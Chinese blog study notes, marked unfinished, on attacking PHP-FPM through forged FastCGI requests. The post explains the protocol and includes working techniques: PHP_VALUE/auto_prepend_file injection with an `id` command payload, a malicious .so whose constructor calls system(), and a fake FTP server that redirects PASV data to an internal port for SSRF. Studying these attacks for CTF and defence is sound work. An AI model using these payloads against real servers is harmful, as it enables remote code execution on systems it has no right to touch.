@@ -1,0 +1,516 @@
+<!doctype html><html lang=en-us>
+<head>
+<meta charset=utf-8>
+<meta http-equiv=x-ua-compatible content="IE=edge,chrome=1">
+<title>AmiaaaZ's Site | 攻击PHP-FPM学习笔记</title>
+<meta name=viewport content="width=device-width,minimum-scale=1">
+<meta name=generator content="Hugo 0.89.2">
+<meta name=ROBOTS content="INDEX, FOLLOW">
+<link href=/dist/app.css rel=stylesheet>
+<script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga('create','UA-203328343-1','auto'),ga('send','pageview'))</script>
+<script async src=https://www.google-analytics.com/analytics.js></script>
+<link rel=stylesheet href=https://amiaaaz.github.io/lib/katex.min.css integrity=sha384-zB1R0rpPzHqg7Kpt0Aljp8JPLqbXI3bhnPWROx27a9N0Ll6ZP/+DiW/UqRcLbRjq crossorigin=anonymous>
+<script defer src=https://amiaaaz.github.io/lib/katex.min.js integrity=sha384-y23I5Q6l+B6vatafAwxRu/0oK/79VlbSz7Q9aiSZUvyWYIYsd+qj+o24G5ZU2zJz crossorigin=anonymous></script>
+<script defer src=https://amiaaaz.github.io/lib/contrib/auto-render.min.js integrity=sha384-kWPLUVMOks5AQFrykwIup5lo0m3iMkkHrD0uJ4H5cjeGihAutqP0yW0J6dpFiVkI crossorigin=anonymous onload=renderMathInElement(document.body)></script>
+<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script>
+<script>(function(f,b){var c=document,d='script',a=c.createElement(d),e=c.getElementsByTagName(d)[0];a.src=f,b&&a.addEventListener('load',function(a){b(a)}),e.parentNode.insertBefore(a,e)})('https://amiaaaz.github.io/lib/pangu.min.js',function(){pangu.spacingPage()})</script>
+<style type=text/css media="screen, print">@font-face{font-family:fancytitlefont;font-style:normal;font-display:swap;src:url(%25!s%28%3cnil%3e%29.woff2)format('woff2'),url(%25!s%28%3cnil%3e%29.woff)format('woff')}@font-face{font-family:noto serif cjk sc;font-style:normal;font-weight:300;font-display:swap;src:local('Noto Serif CJK SC Light'),local('NotoSerifCJK-Light'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-300.woff2)format('woff2'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-300.woff)format('woff')}@font-face{font-family:noto serif cjk sc;font-style:normal;font-weight:400;font-display:swap;src:local('Noto Serif CJK SC'),local('NotoSerifCJK-Regular'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-regular.woff2)format('woff2'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-regular.woff)format('woff')}@font-face{font-family:noto serif cjk sc;font-style:normal;font-weight:500;font-display:swap;src:local('Noto Serif CJK SC Medium'),local('NotoSerifCJK-Medium'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-500.woff2)format('woff2'),url(https://amiaaaz.github.io/fonts/noto-serif-sc-v7-latin_chinese-simplified-500.woff)format('woff')}</style>
+</head>
+<body class="bg-gray-100 text-gray-700 font-sans">
+<div class="p-6 sm:p-10 md:p-16 flex flex-wrap">
+<header class="w-full md:w-2/5 xl:w-1/2 md:pr-12 lg:pr-20 xl:pr-24 order-1 md:order-1 max-w-2xl">
+<div class="z-50 bg-gray-100 bg-opacity-75 bg-opacity-custom lg:min-w-0.7 max-w-xl md:float-right md:text-right leading-loose tracking-tight md:sticky md:top-0 pt-2">
+<div>
+<h2>
+<a href=https://amiaaaz.github.io/ title="AmiaaaZ's Site" class="heading font-cursive icon">AmiaaaZ's Site</a>
+</h2>
+</div>
+<h1 class=pt-2>攻击PHP-FPM学习笔记</h1>
+<h3 class="text-java-700 font-normal leading-relaxed pt-2">如果你能看到这行字，说明这篇笔记还是个半成品2333333</h3>
+<div class="flex flex-wrap justify-end pt-2"><div class="md:flex-grow-0 font-light">
+<a class="post-taxonomy-category text-medium-red-violet-600 hover:text-medium-red-violet-400" href=/categories/notessummary>NOTES&SUMMARY</a>
+&nbsp;&nbsp;
+<a class="post-taxonomy-tag text-eucalyptus-500" href=/tags/php>PHP</a>&nbsp;/
+<a class="post-taxonomy-tag text-eucalyptus-500" href=/tags/php-fpm>php-fpm</a>
+</div><time class="text-eucalyptus-500 md:text-right md:flex-grow font-light pl-4" datetime=2021-11-15T01:58:35+08:00>2021-11-15 01:58</time>
+</div>
+<details class=toc open>
+<summary>
+<hr>
+</summary>
+<div class="inline toc-content">
+<nav id=TableOfContents>
+<ul>
+<li><a href=#前置知识>前置知识</a>
+<ul>
+<li><a href=#cgifastcgi>CGI/FastCGI</a></li>
+<li><a href=#配置>配置</a></li>
+</ul>
+</li>
+<li><a href=#漏洞成因>漏洞成因</a></li>
+<li><a href=#攻击思路>攻击思路</a>
+<ul>
+<li><a href=#远程攻击php-fpm>远程攻击php-fpm</a></li>
+<li><a href=#ssrf攻击本地php-fpm>***SSRF攻击本地php-fpm</a></li>
+<li><a href=#结合ftppasv-mode攻击本地php-fpm>结合ftp&PASV mode攻击本地php-fpm</a></li>
+<li><a href=#攻击unix-socket模式下的php-fpm>***攻击unix socket模式下的php-fpm</a></li>
+</ul>
+</li>
+<li><a href=#在题目中的表现>在题目中的表现</a>
+<ul>
+<li><a href=#wmctf-2021make-php-great-again-and-again>[WMCTF 2021]Make PHP Great Again And Again</a></li>
+<li><a href=#蓝帽杯-2021one-pointer-php>***[蓝帽杯 2021]One Pointer PHP</a></li>
+</ul>
+</li>
+</ul>
+</nav>
+</div>
+</details>
+<hr>
+</div>
+</header>
+<main role=main class="w-full md:w-3/5 xl:w-1/2 max-w-3xl order-2 md:order-2 min-h-70vh pt-2 pb-4">
+<article>
+<section class="mx-auto content">
+<div class=c-rich-text><p>之前做题总是会见到，但并不是很懂实际的原理，有点云里雾里的，好像懂了但又没有完全懂，是时候专门来学一下咯！</p>
+<p>没有什么新鲜的东西，只不过把师傅们已有的文章进行一个整合&重新整理，不过自己亲自过一遍手懂了很多东西，参考链接放到最后啦w</p>
+<h2 id=前置知识>前置知识</h2>
+<h3 id=cgifastcgi>CGI/FastCGI</h3>
+<p>CGI协议用于处理html这类静态文件之后出现的动态语言的解释器与webserver通信的问题，具体的实现有php-cgi</p>
+<p>CGI的弊端是令webserver每次处理请求时都会fork一个cgi进程，结束后再kill，比较浪费资源，FastCGI协议就解决了这个问题，处理完请求后不会kill而是保留该进程，使它可以一次处理多个请求，这样就不用每次fork了</p>
+<p>而php-fpm就是FastCGI协议的一个具体实现，作为FastCGI进程管理器（运行时有一个主进程和多个包含php解释器的worker进程来执行代码），用于接收webserver的请求</p>
+<h3 id=配置>配置</h3>
+<p>php-fpm通信方式有tcp（本地监听9000端口）和unix socket套接字两种方式，题目中可以见到的都是tcp9000</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>apt update
+apt install nginx -y
+apt install software-properties-common -y
+apt install php7.4-fpm -y
+</code></pre></div><h4 id=tcp模式>tcp模式</h4>
+<p>/etc/php/7.4/fpm/pool.d/www.conf</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ini data-lang=ini><span style=color:#75af00>listen</span> <span style=color:#f92672>=</span> <span style=color:#d88200>127.0.0.1:9000</span>
+</code></pre></div><p>/etc/nginx/sites-enabled/default</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ini data-lang=ini><span style=color:#75af00>server{</span>
+	<span style=color:#75af00>...</span>
+	<span style=color:#75af00>location ~ \.php$ {</span>
+        <span style=color:#75af00>include snippets/fastcgi-php.conf;</span>
+        <span style=color:#75af00>fastcgi_pass 127.0.0.1:9000;</span>
+	<span style=color:#75af00>}</span>
+<span style=color:#75af00>...</span>
+<span style=color:#75af00>}</span>
+</code></pre></div><h4 id=unix-socket模式>***unix socket模式</h4>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>service nginx start	<span style=color:#75715e># reload</span>
+/etc/init.d/php7.4-fpm start	<span style=color:#75715e># restart</span>
+</code></pre></div><p>如果出现报错请查看对应日志</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>cat /var/log/nginx/error.log
+cat /var/log/php7.4-fpm.log
+</code></pre></div><h2 id=漏洞成因>漏洞成因</h2>
+<p>按FastCGI协议传输的内容分为header和body两部分</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#00a8c8>typedef</span> <span style=color:#00a8c8>struct</span> <span style=color:#111>{</span>
+  <span style=color:#75715e>/* Header */</span>
+  <span style=color:#00a8c8>unsigned</span> <span style=color:#00a8c8>char</span> <span style=color:#111>version</span><span style=color:#111>;</span> <span style=color:#75715e>// 版本
+</span><span style=color:#75715e></span>  <span style=color:#00a8c8>unsigned</span> <span style=color:#00a8c8>char</span> <span style=color:#111>type</span><span style=color:#111>;</span> <span style=color:#75715e>// 本次record的类型
+</span><span style=color:#75715e></span>  <span style=color:#00a8c8>unsigned</span> <span style=color:#00a8c8>char</span> <span style=color:#111>requestIdB1</span><span style=color:#111>;</span> <span style=color:#75715e>// 本次record对应的请求id
+</span><span style=color:#75715e></span>  <span style=color:#00a8c8>unsigned</span> <span style=color:#00a8c8>char</span> <span style=color:#111>requestIdB0</span><span style=color:#111>;</span>
+  <span style=color:#00a8c8>unsigned</span> <span style=color:#00a8c8>char</span> <span style=color:#111>contentLengthB1</span><span style=color:#111>;</span> <span style=color:#75715e>// body体的大小
+</span><span style=color:#75715e></span>  <span style=color:#00a8c8>unsigned</span> <span style=color:#00a8c8>char</span> <span style=color:#111>contentLengthB0</span><span style=color:#111>;</span>
+  <span style=color:#00a8c8>unsigned</span> <span style=color:#00a8c8>char</span> <span style=color:#111>paddingLength</span><span style=color:#111>;</span> <span style=color:#75715e>// 额外块大小
+</span><span style=color:#75715e></span>  <span style=color:#00a8c8>unsigned</span> <span style=color:#00a8c8>char</span> <span style=color:#111>reserved</span><span style=color:#111>;</span>
+
+  <span style=color:#75715e>/* Body */</span>
+  <span style=color:#00a8c8>unsigned</span> <span style=color:#00a8c8>char</span> <span style=color:#111>contentData</span><span style=color:#111>[</span><span style=color:#111>contentLength</span><span style=color:#111>];</span>
+  <span style=color:#00a8c8>unsigned</span> <span style=color:#00a8c8>char</span> <span style=color:#111>paddingData</span><span style=color:#111>[</span><span style=color:#111>paddingLength</span><span style=color:#111>];</span>
+<span style=color:#111>}</span> <span style=color:#111>FCGI_Record</span><span style=color:#111>;</span>
+</code></pre></div><p>先从heder中拿到body体大小（最大2^16=65535字节），再从tcp流里读取大小等于contentLenth的body，之后还有一部分额外的padding</p>
+<p>header中的type起到指定record的作用，因为FastCGI的单个record大小有限作用单一，所以我们需要一个TCP流中传输多个record，通过type来标识每个record的作用是什么，requestId做到区分每一次的请求</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112110643128.png alt=image-20211112110643128></p>
+<p>当type=4时，表明消息中包含的数据为某个name-value对，比如（虽然但是，我也不知道这个主题下json渲染出来的颜色这么阴间）</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=color:#111>{</span>
+    <span style=color:#960050;background-color:#1e0010>&#39;GATEWAY_INTERFACE&#39;:</span> <span style=color:#960050;background-color:#1e0010>&#39;FastCGI/1.0&#39;,</span>
+    <span style=color:#960050;background-color:#1e0010>&#39;REQUEST_METHOD&#39;:</span> <span style=color:#960050;background-color:#1e0010>&#39;GET&#39;,</span>
+    <span style=color:#960050;background-color:#1e0010>&#39;SCRIPT_FILENAME&#39;:</span> <span style=color:#960050;background-color:#1e0010>&#39;/var/www/html/index.php&#39;,</span>
+    <span style=color:#960050;background-color:#1e0010>&#39;SCRIPT_NAME&#39;:</span> <span style=color:#960050;background-color:#1e0010>&#39;/index.php&#39;,</span>
+    <span style=color:#960050;background-color:#1e0010>&#39;QUERY_STRING&#39;:</span> <span style=color:#960050;background-color:#1e0010>&#39;?a=1&amp;b=2&#39;,</span>
+    <span style=color:#960050;background-color:#1e0010>&#39;REQUEST_URI&#39;:</span> <span style=color:#960050;background-color:#1e0010>&#39;/index.php?a=1&amp;b=2&#39;,</span>
+    <span style=color:#960050;background-color:#1e0010>&#39;DOCUMENT_ROOT&#39;:</span> <span style=color:#960050;background-color:#1e0010>&#39;/var/www/html&#39;,</span>
+    <span style=color:#960050;background-color:#1e0010>&#39;SERVER_SOFTWARE&#39;:</span> <span style=color:#960050;background-color:#1e0010>&#39;php/fcgiclient&#39;,</span>
+    <span style=color:#960050;background-color:#1e0010>&#39;REMOTE_ADDR&#39;:</span> <span style=color:#960050;background-color:#1e0010>&#39;127.0.0.1&#39;,</span>
+    <span style=color:#960050;background-color:#1e0010>&#39;REMOTE_PORT&#39;:</span> <span style=color:#960050;background-color:#1e0010>&#39;12345&#39;,</span>
+    <span style=color:#960050;background-color:#1e0010>&#39;SERVER_ADDR&#39;:</span> <span style=color:#960050;background-color:#1e0010>&#39;127.0.0.1&#39;,</span>
+    <span style=color:#960050;background-color:#1e0010>&#39;SERVER_PORT&#39;:</span> <span style=color:#960050;background-color:#1e0010>&#39;80&#39;,</span>
+    <span style=color:#960050;background-color:#1e0010>&#39;SERVER_NAME&#39;:</span> <span style=color:#f92672>&#34;localhost&#34;</span><span style=color:#111>,</span>
+    <span style=color:#960050;background-color:#1e0010>&#39;SERVER_PROTOCOL&#39;:</span> <span style=color:#960050;background-color:#1e0010>&#39;HTTP/1.1&#39;</span>
+<span style=color:#111>}</span>
+</code></pre></div><p>其中<code>SCRIPT_FILENAME</code>就是php-fpm会去执行的文件，由于5.3.9版本引入了<code>security.limit_extensions</code>的选项，默认对后缀名限制在了php家族，所以我们可以考虑找到已存在php文件（安装时附带的php文件 可以通过<code>find / -name "*.php"</code>来搜索一下默认环境 比如/usr/local/lib/php/PEAR.php），向其中注入恶意代码；而fpm支持通过设置<code>FASTCGI_PARAMS</code>来动态修改php的设置，可以利用这两项</p>
+<pre tabindex=0><code>'PHP_VALUE': 'auto_prepend_file = php://input',
+'PHP_ADMIN_VALUE': 'allow_url_include = On'
+</code></pre><p>来做到执行某php文件时自动包含POST内容，执行恶意代码（disable_function在php加载时就确定了，无法重写）</p>
+<h2 id=攻击思路>攻击思路</h2>
+<p>伪造一个可以正常通信的FastCGI客户端，将传输的内容修改为我们的恶意payload，再发出去</p>
+<h3 id=远程攻击php-fpm>远程攻击php-fpm</h3>
+<p>这里是<a href=https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75>p牛的脚本</a>，兼容py2&3，默认-p 9000，-c <code>&lt;?php phpinfo();?></code></p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>python fpm.py target_ip /var/www/html/index.php -c <span style=color:#d88200>&#39;&lt;?php echo `id`;exit;?&gt;&#39;</span>
+</code></pre></div><p>我们需要改动的只有params部分的<code>PHP_ADMIN_VALUE</code></p>
+<pre tabindex=0><code>'PHP_ADMIN_VALUE': 'allow_url_include = On\nextension = /home/amelia/TEMP/fpm/wuhu.so',
+</code></pre><p>成功</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112175028236.png alt=image-20211112175028236></p>
+<p>需要注意的是，如果只是加载恶意.so而不执行代码，则并不需要有已存在php文件的绝对路径，用<code>_</code>占位即可</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>python fpm.py target_ip _ -c <span style=color:#d88200>&#39;&lt;?php echo `id`;exit;?&gt;&#39;</span>
+</code></pre></div><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112175353957.png alt=image-20211112175353957></p>
+<h3 id=ssrf攻击本地php-fpm>***SSRF攻击本地php-fpm</h3>
+<p>利用<code>gopher://</code>协议可以直接传输TCP协议流，我们构造好payload之后urlencode就可以传入进行ssrf攻击了</p>
+<h3 id=结合ftppasv-mode攻击本地php-fpm>结合ftp&PASV mode攻击本地php-fpm</h3>
+<h4 id=ftp使用pasv模式转发ftp-data>ftp使用PASV模式转发ftp-data</h4>
+<p>先简单测试ftp连接进行抓包</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112195819783.png alt=image-20211112195819783></p>
+<p>其中的<code>227 Entering Passive Mode (192,168,187,3,230,20)</code>的括号内的内容表示的是传输的FTP-DATA打向的位置，前一部分是ip，端口是230*256+20=58900</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112200459682.png alt=image-20211112200459682></p>
+<p>可以看到我们文件内容是150ok之后才被传出去的，而且会被放在FTP-DATA中被上传和下载</p>
+<p>我们可以模拟一个ftp-server，在响应PASV命令（即passive 切换被动模式）时返回<code>(127,0,0,1,0,12345)</code>来让FTP-DATA打向内网12345端口；这是一个恶意ftp-server</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e># 192.168.187.1</span>
+<span style=color:#f92672>import</span> <span style=color:#111>socket</span>
+<span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#d88200>&#34;[+] listening ...........&#34;</span><span style=color:#111>)</span>
+<span style=color:#111>s</span> <span style=color:#f92672>=</span> <span style=color:#111>socket</span><span style=color:#f92672>.</span><span style=color:#111>socket</span><span style=color:#111>(</span><span style=color:#111>socket</span><span style=color:#f92672>.</span><span style=color:#111>AF_INET</span><span style=color:#111>,</span> <span style=color:#111>socket</span><span style=color:#f92672>.</span><span style=color:#111>SOCK_STREAM</span><span style=color:#111>)</span>
+<span style=color:#111>s</span><span style=color:#f92672>.</span><span style=color:#111>bind</span><span style=color:#111>((</span><span style=color:#d88200>&#39;0.0.0.0&#39;</span><span style=color:#111>,</span> <span style=color:#ae81ff>9999</span><span style=color:#111>))</span>
+<span style=color:#111>s</span><span style=color:#f92672>.</span><span style=color:#111>listen</span><span style=color:#111>(</span><span style=color:#ae81ff>1</span><span style=color:#111>)</span>
+<span style=color:#111>conn</span><span style=color:#111>,</span> <span style=color:#111>addr</span> <span style=color:#f92672>=</span> <span style=color:#111>s</span><span style=color:#f92672>.</span><span style=color:#111>accept</span><span style=color:#111>()</span>
+<span style=color:#111>conn</span><span style=color:#f92672>.</span><span style=color:#111>send</span><span style=color:#111>(</span><span style=color:#d88200>b</span><span style=color:#d88200>&#39;220 (vsFTPd 3.0.3)</span><span style=color:#8045ff>\r\n</span><span style=color:#d88200>&#39;</span><span style=color:#111>)</span>
+<span style=color:#111>conn</span><span style=color:#f92672>.</span><span style=color:#111>recv</span><span style=color:#111>(</span><span style=color:#ae81ff>0xff</span><span style=color:#111>)</span>
+<span style=color:#111>conn</span><span style=color:#f92672>.</span><span style=color:#111>send</span><span style=color:#111>(</span><span style=color:#d88200>b</span><span style=color:#d88200>&#39;331 Please specify the password.</span><span style=color:#8045ff>\r\n</span><span style=color:#d88200>&#39;</span><span style=color:#111>)</span>
+<span style=color:#111>conn</span><span style=color:#f92672>.</span><span style=color:#111>recv</span><span style=color:#111>(</span><span style=color:#ae81ff>0xff</span><span style=color:#111>)</span>
+<span style=color:#111>conn</span><span style=color:#f92672>.</span><span style=color:#111>send</span><span style=color:#111>(</span><span style=color:#d88200>b</span><span style=color:#d88200>&#39;230 Login successful.</span><span style=color:#8045ff>\r\n</span><span style=color:#d88200>&#39;</span><span style=color:#111>)</span>
+<span style=color:#111>conn</span><span style=color:#f92672>.</span><span style=color:#111>recv</span><span style=color:#111>(</span><span style=color:#ae81ff>0xff</span><span style=color:#111>)</span>
+<span style=color:#111>conn</span><span style=color:#f92672>.</span><span style=color:#111>send</span><span style=color:#111>(</span><span style=color:#d88200>b</span><span style=color:#d88200>&#34;215 UNIX Type: L8</span><span style=color:#8045ff>\r\n</span><span style=color:#d88200>&#34;</span><span style=color:#111>)</span>
+<span style=color:#111>conn</span><span style=color:#f92672>.</span><span style=color:#111>recv</span><span style=color:#111>(</span><span style=color:#ae81ff>0xff</span><span style=color:#111>)</span>
+<span style=color:#111>conn</span><span style=color:#f92672>.</span><span style=color:#111>send</span><span style=color:#111>(</span><span style=color:#d88200>b</span><span style=color:#d88200>&#39;200 Switching to Binary mode.</span><span style=color:#8045ff>\r\n</span><span style=color:#d88200>&#39;</span><span style=color:#111>)</span>
+<span style=color:#111>conn</span><span style=color:#f92672>.</span><span style=color:#111>recv</span><span style=color:#111>(</span><span style=color:#ae81ff>0xff</span><span style=color:#111>)</span>
+<span style=color:#111>conn</span><span style=color:#f92672>.</span><span style=color:#111>send</span><span style=color:#111>(</span><span style=color:#d88200>b</span><span style=color:#d88200>&#39;227 Entering Passive Mode (127,0,0,1,0,12345).</span><span style=color:#8045ff>\r\n</span><span style=color:#d88200>&#39;</span><span style=color:#111>)</span>
+<span style=color:#111>conn</span><span style=color:#f92672>.</span><span style=color:#111>recv</span><span style=color:#111>(</span><span style=color:#ae81ff>0xff</span><span style=color:#111>)</span>
+<span style=color:#111>conn</span><span style=color:#f92672>.</span><span style=color:#111>send</span><span style=color:#111>(</span><span style=color:#d88200>b</span><span style=color:#d88200>&#39;150 Ok to send data.</span><span style=color:#8045ff>\r\n</span><span style=color:#d88200>&#39;</span><span style=color:#111>)</span>
+<span style=color:#75715e># sending payload .....</span>
+<span style=color:#111>conn</span><span style=color:#f92672>.</span><span style=color:#111>send</span><span style=color:#111>(</span><span style=color:#d88200>b</span><span style=color:#d88200>&#39;226 Transfer complete.</span><span style=color:#8045ff>\r\n</span><span style=color:#d88200>&#39;</span><span style=color:#111>)</span>
+<span style=color:#111>conn</span><span style=color:#f92672>.</span><span style=color:#111>recv</span><span style=color:#111>(</span><span style=color:#ae81ff>0xff</span><span style=color:#111>)</span>
+<span style=color:#111>conn</span><span style=color:#f92672>.</span><span style=color:#111>send</span><span style=color:#111>(</span><span style=color:#d88200>b</span><span style=color:#d88200>&#39;221 Goodbye.</span><span style=color:#8045ff>\r\n</span><span style=color:#d88200>&#39;</span><span style=color:#111>)</span>
+<span style=color:#111>conn</span><span style=color:#f92672>.</span><span style=color:#111>close</span><span style=color:#111>()</span>
+<span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#d88200>&#34;[+] completed ~~&#34;</span><span style=color:#111>)</span>
+</code></pre></div><p>在另一台192.168.187.3上访问这个恶意服务，期间传输的文件就会被转发到192.168.187.3自己的12345端口</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112233757565.png alt=image-20211112233757565></p>
+<h4 id=php加载恶意so文件>php加载恶意.so文件</h4>
+<p>修改php.ini /etc/php/7.4/cli/php.ini</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ini data-lang=ini><span style=color:#00a8c8>[PHP]</span>
+<span style=color:#75af00>extension</span><span style=color:#f92672>=</span><span style=color:#d88200>/home/amelia/TEMP/fpm/wuhu.so</span>
+</code></pre></div><p>C源码</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#75715e>#define _GNU_SOURCE
+</span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdlib.h&gt;</span><span style=color:#75715e>
+</span><span style=color:#75715e></span>
+<span style=color:#111>__attribute__</span> <span style=color:#111>((</span><span style=color:#111>__constructor__</span><span style=color:#111>))</span> <span style=color:#00a8c8>void</span> <span style=color:#111>preload</span> <span style=color:#111>(</span><span style=color:#00a8c8>void</span><span style=color:#111>){</span>
+        <span style=color:#111>system</span><span style=color:#111>(</span><span style=color:#d88200>&#34;touch /home/amelia/TEMP/fpm/pwned&#34;</span><span style=color:#111>);</span>
+<span style=color:#111>}</span>
+</code></pre></div><p>编译为.so</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>gcc wuhu.c -o wuhu.so --shared -fPIC
+</code></pre></div><p>运行php即触发恶意.so</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112162658685.png alt=image-20211112162658685></p>
+<h4 id=令php使用ftp>令php使用ftp://</h4>
+<p>/etc/php/7.4/cli/php.ini</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ini data-lang=ini><span style=color:#75af00>allow_url_fopen</span> <span style=color:#f92672>=</span> <span style=color:#d88200>On</span>
+</code></pre></div><p>ftp读 注意后面的路径都需要绝对路径</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#75af00>php</span>
+<span style=color:#f92672>@</span><span style=color:#75af00>var_dump</span><span style=color:#111>(</span><span style=color:#75af00>file_get_contents</span><span style=color:#111>(</span><span style=color:#111>$argv</span><span style=color:#111>[</span><span style=color:#ae81ff>1</span><span style=color:#111>]));</span>
+</code></pre></div><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>php ftp_read.php <span style=color:#d88200>&#39;ftp://test:test@192.168.187.3/home/test/flag.txt&#39;</span>
+</code></pre></div><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112215002622.png alt=image-20211112215002622></p>
+<p>ftp写</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#75af00>php</span>
+<span style=color:#f92672>@</span><span style=color:#75af00>var_dump</span><span style=color:#111>(</span><span style=color:#75af00>file_put_contents</span><span style=color:#111>(</span><span style=color:#111>$argv</span><span style=color:#111>[</span><span style=color:#ae81ff>1</span><span style=color:#111>],</span> <span style=color:#111>$agrv</span><span style=color:#111>[</span><span style=color:#ae81ff>2</span><span style=color:#111>]));</span>
+</code></pre></div><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#75af00>php</span> <span style=color:#75af00>ftp_write</span><span style=color:#f92672>.</span><span style=color:#75af00>php</span> <span style=color:#d88200>&#39;ftp://test:test@192.168.187.3/home/test/test.txt&#39;</span> <span style=color:#d88200>&#39;hello, world&#39;</span>
+</code></pre></div><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112223440182.png alt=image-20211112223440182></p>
+<p>但是这里一直是可以新建文件但是写入不了，读入的参数2一直是int(0)，暂时还没解决问题（不过用下面那个写入很正常……</p>
+<p>覆盖已存在文件</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#75af00>php</span>
+<span style=color:#111>$context</span> <span style=color:#f92672>=</span> <span style=color:#75af00>stream_context_create</span><span style=color:#111>(</span><span style=color:#00a8c8>array</span><span style=color:#111>(</span><span style=color:#d88200>&#39;ftp&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#00a8c8>array</span><span style=color:#111>(</span><span style=color:#d88200>&#39;overwrite&#39;</span> <span style=color:#f92672>=&gt;</span> <span style=color:#00a8c8>true</span><span style=color:#111>)));</span>
+<span style=color:#f92672>@</span><span style=color:#75af00>var_dump</span><span style=color:#111>(</span><span style=color:#75af00>file_put_contents</span><span style=color:#111>(</span><span style=color:#111>$argv</span><span style=color:#111>[</span><span style=color:#ae81ff>1</span><span style=color:#111>],</span> <span style=color:#111>$argv</span><span style=color:#111>[</span><span style=color:#ae81ff>2</span><span style=color:#111>],</span> <span style=color:#ae81ff>0</span><span style=color:#111>,</span> <span style=color:#111>$context</span><span style=color:#111>));</span>
+</code></pre></div><div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>php ftp_write_2.php <span style=color:#d88200>&#39;ftp://test:test@192.168.187.3/home/test/test.txt&#39;</span> <span style=color:#d88200>&#39;newwwwew&#39;</span>
+</code></pre></div><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211112225832777.png alt=image-20211112225832777></p>
+<h4 id=令php使用ftp并转发ftp-data>令php使用ftp://并转发FTP-DATA</h4>
+<p>将上面的操作用wireshark抓个包看看流量</p>
